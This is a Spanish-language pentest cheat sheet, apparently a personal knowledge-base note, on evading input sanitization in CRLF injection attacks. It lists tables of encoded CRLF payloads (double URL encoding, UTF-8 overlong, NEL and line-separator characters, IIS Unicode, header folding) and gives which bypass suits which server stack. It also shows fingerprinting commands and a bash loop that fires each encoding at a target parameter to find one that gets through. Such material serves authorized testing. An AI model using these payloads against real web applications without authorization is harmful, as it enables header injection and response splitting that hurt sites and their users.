---
aliases:
  - CRLF Bypass
  - CRLF Encoding
  - Filter Evasion CRLF
tags:
  - vuln/crlf-injection
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[CRLF Injection]]"
---
# CRLF Injection - Bypass de Sanitización

***

## URL Encoding Variants

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `%0d%0a` | CR+LF estándar URL-encoded | Probe baseline. |
| `%0a` | LF solo | App acepta LF sin CR (mayoría de parsers HTTP). |
| `%0d` | CR solo | Algunos parsers (poco frecuente). |
| `%0D%0A` | Mayúsculas en hex | Bypass de regex case-sensitive `/%0d/`. |
| `%u000d%u000a` | Unicode IIS-style | Apps legacy con IIS Url decoding. |
| `&#13;&#10;` / `&#x0d;&#x0a;` / `&NewLine;` | HTML entities | El input se refleja en HTML antes de procesarse. |
| `\r\n` literal (sin encoding) | Backend interpreta escape | El campo se procesa como JSON/JS string. |
| `\\r\\n` | Doble-escape | Pipeline JSON→string→header. |
^crlfi-bypass-url

___

## Double Encoding

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `%250d%250a` | Doble URL encoding (`%25` = `%`) | Proxy + app decodifican una vez cada uno. |
| `%25250d%25250a` | Triple encoding | Cadena de 3 decoders (proxy + WAF + app). |
| `%26%2313%3B%26%2310%3B` | URL-encoded HTML entity `&#13;&#10;` | App decodifica URL → HTML entity reflejada → backend procesa. |
| `%E5%98%8A%E5%98%8D` | UTF-8 overlong/best-fit que mapea a CR/LF en algunos charsets | Apps Java/Tomcat con conversión Unicode laxa. |
| `+%0d%0a` | `+` se decodifica como espacio + CRLF | Form-encoded con `application/x-www-form-urlencoded`. |
^crlfi-bypass-double

___

## Unicode / Charset Variants

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `%c2%85` | NEL (Next Line, U+0085) UTF-8 | Backend que tratea NEL como line break (Java legacy). |
| `%e2%80%a8` | LINE SEPARATOR (U+2028) UTF-8 | Contexto JS — algunos parsers JS lo tratan como newline. |
| `%e2%80%a9` | PARAGRAPH SEPARATOR (U+2029) UTF-8 | Mismo contexto que U+2028. |
| `%0b` / `%0c` | VT (Vertical Tab) / FF (Form Feed) | Algunos servers HTTP-laxos lo procesan como separador. |
| `%c0%8a` | UTF-8 overlong para LF (`0x0a`) | Parsers legacy sin validación overlong. |
| `+ADw-+AGEA-` | UTF-7 encoding | IE legacy, parsers sin charset enforcement. |
^crlfi-bypass-unicode

___

## Server-Specific Quirks

| **Comando de fingerprint** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI https://target \| grep -i server` | Identifica server (Apache/nginx/IIS/...) | Selección de encoding adecuado. |
| `curl -sI -H 'X-Test: a\r\nb: c' https://target` | Test header con CRLF — modern frameworks rechazan | Detecta validación strict del framework. |
| `whatweb https://target` | Fingerprint stack completo (Express/Flask/Django/etc.) | Backend-specific bypass selection. |
| `nuclei -t http/technologies/ -u https://target` | Detección de tecnologías | Identifica versión vulnerable. |
^crlfi-bypass-server

**Cuál bypass por stack:**

| Stack | Bypass que suele funcionar |
|---|---|
| IIS / ASP.NET clásico | `%u000d%u000a` Unicode |
| Apache 2.x (legacy) | `%0a` solo |
| Tomcat/Jetty | UTF-8 overlong `%c0%8a` |
| Node.js raw | Rechaza CRLF en header() — buscar concat manual |
| PHP `header()` pre-5.4 | `%0a` solo |
| Custom CGI | Doble encoding `%250d%250a` |

___

## Header Folding (Obsolete pero edge)

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `X-Header:%20value%0d%0a%20continued` | Continuation line con espacio leading | RFC 822 folding — legacy CGI/Java. |
| `X-Header:%20value%0d%0a%09continued` | Continuation con TAB | Misma idea, parser laxo. |
| `%0d%0a%20Injected:%20bar` | Inyección como continuation del header anterior | Bypass de validación que solo rechaza CRLF estándar. |
^crlfi-bypass-folding

### Encoding bypass matrix

```bash
TARGET="https://target/redirect"
PARAM="url"
PROBE="X-CRLF-Probe:%20FOUND"

ENCODINGS=(
  '%0d%0a'         # Standard
  '%0a'            # LF only
  '%0d'            # CR only
  '%250d%250a'     # Doble URL encoding
  '%E5%98%8A%E5%98%8D'  # UTF-8 best-fit
  '%u000d%u000a'   # IIS Unicode
  '%c2%85'         # NEL UTF-8
  '%e2%80%a8'      # LINE SEPARATOR
  '%c0%8a'         # UTF-8 overlong LF
)

for enc in "${ENCODINGS[@]}"; do
  echo "=== $enc ==="
  PAYLOAD="test${enc}${PROBE}"
  curl -sI "$TARGET?$PARAM=$PAYLOAD" | grep -i 'X-CRLF-Probe:' && \
    echo "[+] Bypass works: $enc"
done
```

***
